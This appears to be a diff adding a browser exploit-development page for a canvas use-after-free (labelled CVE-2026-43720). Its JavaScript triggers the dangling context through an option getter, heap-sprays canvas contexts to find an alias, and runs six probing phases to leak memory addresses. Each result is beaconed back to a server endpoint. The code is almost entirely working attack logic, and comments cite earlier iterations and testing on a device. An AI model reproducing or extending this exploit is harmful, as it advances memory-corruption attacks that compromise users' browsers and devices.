@@ -1,0 +1,371 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635j</title></head>
+<body><pre id="out">p635j: Canvas UAF — Error.stack + string internals + toString</pre>
+<script>
+'use strict';
+/*
+  p635j: CVE-2026-43720 — Error.stack + string internals info leak
+  -- prior art: p635g 6 same-type phases ALL CLEAN (no double/pixel leaks)
+  -- prior art: p635h bmr.canvas CRASHES (dangling pointer confirmed)
+  -- prior art: p596 Error.stack never tested on device
+  -- prior art: WebAssembly ABSENT, SharedArrayBuffer ABSENT, CSS timing DEAD
+
+  CRASH_CLASS: LOW — only error triggering and string inspection
+
+  Strategy:
+  A) Error.stack: trigger various errors through the UAF alias, inspect
+     stack traces for leaked addresses (release builds may strip them)
+  B) toString/valueOf on UAF contexts: force JS type coercion on alias
+     and inner objects — may expose internal pointers in debug strings
+  C) String property confusion: set fillStyle through alias to trigger
+     CSS color parsing, read through inner — parser errors might expose
+     internal state or addresses
+  D) Constructor/prototype chain inspection: check if UAF contexts have
+     unexpected prototype chains or constructor names
+  E) JSON.stringify with replacer: deep serialize the contexts to find
+     hidden enumerable properties
+  F) Symbol.toPrimitive / Symbol.toStringTag on UAF objects
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635J-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635j', msg:msg, level:'info', sid:'p635j-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+bk('START', navigator.userAgent);
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return {inner: inner, canvas: cv};
+}
+
+function getAlias(uaf) {
+  var spray = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    spray.push(c.getContext('2d'));
+  }
+  var SENT = Math.random() * 10000 + 1000;
+  try { uaf.inner.lineWidth = SENT; } catch(e) { return null; }
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].lineWidth === SENT) return {alias: spray[i], idx: i, spray: spray};
+  }
+  return null;
+}
+
+// ================================================================
+// PHASE A: Error.stack inspection
+// ================================================================
+bk('A-START', 'Error.stack');
+var uafA = triggerUAF();
+var aliasA = getAlias(uafA);
+bk('A-ALIAS', aliasA ? 'spray['+aliasA.idx+']' : 'NONE');
+
+if (aliasA) {
+  // Test basic Error.stack
+  try { throw new Error('test'); } catch(e) {
+    bk('A-BASIC', 'stack=' + (e.stack || '').slice(0,200));
+  }
+
+  // Trigger TypeError through alias with wrong argument types
+  var errTests = [
+    function() { aliasA.alias.createLinearGradient(undefined, undefined, undefined, undefined); },
+    function() { aliasA.alias.createRadialGradient(NaN, NaN, NaN, NaN, NaN, NaN); },
+    function() { aliasA.alias.drawImage(null, 0, 0); },
+    function() { aliasA.alias.createPattern(null, 'repeat'); },
+    function() { aliasA.alias.putImageData(null, 0, 0); },
+    function() { aliasA.alias.getImageData(-1, -1, 0, 0); },
+    function() { aliasA.alias.createImageData(0, 0); },
+    function() { uafA.inner.drawImage({}, 0, 0); },
+    function() { uafA.inner.setTransform({a:1/0, b:1/0, c:1/0, d:1/0, e:1/0, f:1/0}); },
+  ];
+
+  for (var i = 0; i < errTests.length; i++) {
+    try {
+      errTests[i]();
+      bk('A-ERR-'+i, 'no throw');
+    } catch(e) {
+      var stack = (e.stack || '').replace(/\n/g, ' | ');
+      bk('A-ERR-'+i, e.name + ':' + e.message.slice(0,60) + ' STACK=' + stack.slice(0,200));
+      // Check for hex addresses in stack
+      var hexMatch = stack.match(/0x[0-9a-fA-F]{6,}/g);
+      if (hexMatch) bk('A-HEX-'+i, hexMatch.join(' '));
+    }
+  }
+
+  // Try to get stack from a TypeError on the inner (dangling) reference
+  // accessing properties that might go through C++ and fail
+  try {
+    var badCtx = Object.create(uafA.inner);
+    badCtx.lineWidth = Symbol('test');
+  } catch(e) {
+    bk('A-SYMBOL', e.name + ':' + e.message.slice(0,60) + ' STACK=' + (e.stack||'').slice(0,200));
+  }
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: toString / valueOf / type coercion
+// ================================================================
+bk('B-START', 'toString coercion');
+var uafB = triggerUAF();
+var aliasB = getAlias(uafB);
+bk('B-ALIAS', aliasB ? 'spray['+aliasB.idx+']' : 'NONE');
+
+if (aliasB) {
+  // toString on various objects
+  try { bk('B-INNER-STR', '' + uafB.inner); } catch(e) { bk('B-INNER-STR', 'ERR:'+e.message.slice(0,40)); }
+  try { bk('B-ALIAS-STR', '' + aliasB.alias); } catch(e) { bk('B-ALIAS-STR', 'ERR:'+e.message.slice(0,40)); }
+  try { bk('B-CANVAS-STR', '' + uafB.canvas); } catch(e) { bk('B-CANVAS-STR', 'ERR:'+e.message.slice(0,40)); }
+
+  // toLocaleString
+  try { bk('B-LOCALE', uafB.inner.toLocaleString()); } catch(e) { bk('B-LOCALE', 'ERR:'+e.message.slice(0,40)); }
+
+  // Constructor info
+  try { bk('B-CTOR', uafB.inner.constructor.name); } catch(e) { bk('B-CTOR', 'ERR'); }
+  try { bk('B-PROTO', Object.getPrototypeOf(uafB.inner).constructor.name); } catch(e) { bk('B-PROTO', 'ERR'); }
+
+  // Symbol.toStringTag
+  try {
+    var tag = uafB.inner[Symbol.toStringTag];
+    bk('B-TAG', 'toStringTag=' + (tag || 'undefined'));
+  } catch(e) { bk('B-TAG', 'ERR:'+e.message.slice(0,40)); }
+
+  // Object.prototype.toString.call
+  try { bk('B-OBJ-STR', Object.prototype.toString.call(uafB.inner)); } catch(e) { bk('B-OBJ-STR', 'ERR'); }
+  try { bk('B-OBJ-STR2', Object.prototype.toString.call(aliasB.alias)); } catch(e) { bk('B-OBJ-STR2', 'ERR'); }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: String property confusion — fillStyle/font parsing edge cases
+// ================================================================
+bk('C-START', 'string property confusion');
+var uafC = triggerUAF();
+var aliasC = getAlias(uafC);
+bk('C-ALIAS', aliasC ? 'spray['+aliasC.idx+']' : 'NONE');
+
+if (aliasC) {
+  // Set fillStyle through alias to values that might confuse CSS color parser
+  var colors = [
+    'rgb(999,999,999)',
+    'hsl(99999, 100%, 50%)',
+    'rgba(0,0,0,' + (1/3) + ')',
+    '#' + 'F'.repeat(100),
+    'url(javascript:void)',
+    'currentColor',
+    'inherit',
+    'Canvas',
+    'CanvasText',
+    'ActiveText',
+    'var(--x)',
+    'env(safe-area-inset-top)',
+  ];
+
+  for (var i = 0; i < colors.length; i++) {
+    try {
+      aliasC.alias.fillStyle = colors[i];
+      var readBack = uafC.inner.fillStyle;
+      bk('C-COLOR-'+i, '"' + colors[i].slice(0,30) + '" -> "' + readBack + '"');
+    } catch(e) {
+      bk('C-COLOR-'+i, 'ERR:' + e.message.slice(0,40));
+    }
+  }
+
+  // Set font to strings with special characters
+  var fonts = [
+    '48px "A'.repeat(1000) + '"',
+    '48px \\',
+    '0px/0px serif',
+    '48px serif, ' + 'a'.repeat(500),
+    '48px ' + String.fromCharCode(0) + 'serif',
+  ];
+  for (var i = 0; i < fonts.length; i++) {
+    try {
+      aliasC.alias.font = fonts[i];
+      var readFont = uafC.inner.font;
+      bk('C-FONT-'+i, 'set len=' + fonts[i].length + ' read="' + readFont.slice(0,60) + '"');
+    } catch(e) {
+      bk('C-FONT-'+i, 'ERR:' + e.message.slice(0,40));
+    }
+  }
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: Deep property enumeration
+// ================================================================
+bk('D-START', 'deep enumeration');
+var uafD = triggerUAF();
+if (uafD.inner) {
+  // Get ALL property names including non-enumerable
+  try {
+    var names = Object.getOwnPropertyNames(uafD.inner);
+    bk('D-NAMES', names.length + ' props: ' + names.join(',').slice(0,300));
+  } catch(e) { bk('D-NAMES', 'ERR:'+e.message.slice(0,40)); }
+
+  // Check for symbols
+  try {
+    var syms = Object.getOwnPropertySymbols(uafD.inner);
+    bk('D-SYMS', syms.length + ' symbols');
+    for (var i = 0; i < syms.length; i++) {
+      try {
+        bk('D-SYM-'+i, String(syms[i]) + '=' + uafD.inner[syms[i]]);
+      } catch(e) {}
+    }
+  } catch(e) { bk('D-SYMS', 'ERR:'+e.message.slice(0,40)); }
+
+  // Prototype chain walk
+  try {
+    var obj = uafD.inner;
+    var chain = [];
+    var depth = 0;
+    while (obj && depth < 10) {
+      chain.push(obj.constructor ? obj.constructor.name : '?');
+      obj = Object.getPrototypeOf(obj);
+      depth++;
+    }
+    bk('D-CHAIN', chain.join(' -> '));
+  } catch(e) { bk('D-CHAIN', 'ERR:'+e.message.slice(0,40)); }
+
+  // Check for non-standard properties on prototype
+  try {
+    var proto = Object.getPrototypeOf(uafD.inner);
+    var pnames = Object.getOwnPropertyNames(proto);
+    // Look for anything unexpected
+    var unexpected = pnames.filter(function(n) {
+      return ['constructor','canvas','globalAlpha','globalCompositeOperation',
+              'strokeStyle','fillStyle','shadowOffsetX','shadowOffsetY',
+              'shadowBlur','shadowColor','filter','save','restore',
+              'scale','rotate','translate','transform','setTransform',
+              'resetTransform','createLinearGradient','createRadialGradient',
+              'createPattern','clearRect','fillRect','strokeRect',
+              'beginPath','fill','stroke','clip','isPointInPath',
+              'isPointInStroke','fillText','strokeText','measureText',
+              'drawImage','createImageData','getImageData','putImageData',
+              'setLineDash','getLineDash','lineDashOffset','closePath',
+              'moveTo','lineTo','quadraticCurveTo','bezierCurveTo',
+              'arcTo','rect','arc','ellipse','lineWidth','lineCap',
+              'lineJoin','miterLimit','font','textAlign','textBaseline',
+              'direction','imageSmoothingEnabled','imageSmoothingQuality',
+              'getTransform','drawFocusIfNeeded','getContextAttributes',
+              'toDataURL','toBlob'].indexOf(n) === -1;
+    });
+    bk('D-UNEXPECTED', unexpected.length > 0 ? unexpected.join(',') : 'none');
+  } catch(e) { bk('D-UNEXPECTED', 'ERR:'+e.message.slice(0,40)); }
+}
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: Typed coercion via valueOf in setTransform
+// ================================================================
+bk('E-START', 'valueOf coercion');
+var uafE = triggerUAF();
+var aliasE = getAlias(uafE);
+bk('E-ALIAS', aliasE ? 'spray['+aliasE.idx+']' : 'NONE');
+
+if (aliasE) {
+  // Use valueOf objects as arguments to trigger coercion in C++ land
+  // The coercion might expose internal state
+  var coerceCount = 0;
+  var coerceObj = {
+    valueOf: function() {
+      coerceCount++;
+      // During valueOf, read the transform through inner
+      try {
+        var t = uafE.inner.getTransform();
+        bk('E-COERCE-'+coerceCount, 'mid-coerce transform a=' + f64hex(t.a) + ' d=' + f64hex(t.d));
+      } catch(e) {}
+      return 42;
+    }
+  };
+
+  // setTransform with valueOf objects — forces C++ to call back into JS mid-operation
+  try {
+    aliasE.alias.setTransform(coerceObj, coerceObj, coerceObj, coerceObj, coerceObj, coerceObj);
+    bk('E-POST', 'setTransform completed, coerceCount=' + coerceCount);
+    var t = uafE.inner.getTransform();
+    bk('E-FINAL', 'a=' + t.a + ' b=' + t.b + ' c=' + t.c + ' d=' + t.d + ' e=' + t.e + ' f=' + t.f);
+  } catch(e) {
+    bk('E-ERR', e.message.slice(0,60));
+  }
+
+  // Try lineWidth with valueOf
+  coerceCount = 0;
+  try {
+    aliasE.alias.lineWidth = coerceObj;
+    bk('E-LW', 'lineWidth=' + uafE.inner.lineWidth + ' coerceCount=' + coerceCount);
+  } catch(e) { bk('E-LW', 'ERR:'+e.message.slice(0,40)); }
+}
+bk('E-DONE', 'survived');
+
+// ================================================================
+// PHASE F: Proxy trap on UAF objects
+// ================================================================
+bk('F-START', 'proxy traps');
+var uafF = triggerUAF();
+if (uafF.inner) {
+  // Wrap inner in a Proxy to intercept all property accesses
+  try {
+    var accessLog = [];
+    var proxy = new Proxy(uafF.inner, {
+      get: function(target, prop) {
+        accessLog.push('get:' + String(prop));
+        return target[prop];
+      },
+      set: function(target, prop, value) {
+        accessLog.push('set:' + String(prop));
+        target[prop] = value;
+        return true;
+      }
+    });
+
+    // Use proxy in operations that trigger internal property access
+    try { proxy.fillRect(0, 0, 1, 1); } catch(e) {}
+    try { proxy.getImageData(0, 0, 1, 1); } catch(e) {}
+    try { '' + proxy.lineWidth; } catch(e) {}
+
+    bk('F-LOG', accessLog.length + ' accesses: ' + accessLog.join(',').slice(0,300));
+  } catch(e) {
+    bk('F-PROXY', 'ERR:' + e.message.slice(0,60));
+  }
+
+  // Check if we can Reflect.ownKeys on the context
+  try {
+    var keys = Reflect.ownKeys(uafF.inner);
+    bk('F-REFLECT', keys.length + ' keys: ' + keys.map(String).join(',').slice(0,200));
+  } catch(e) { bk('F-REFLECT', 'ERR:'+e.message.slice(0,40)); }
+}
+bk('F-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
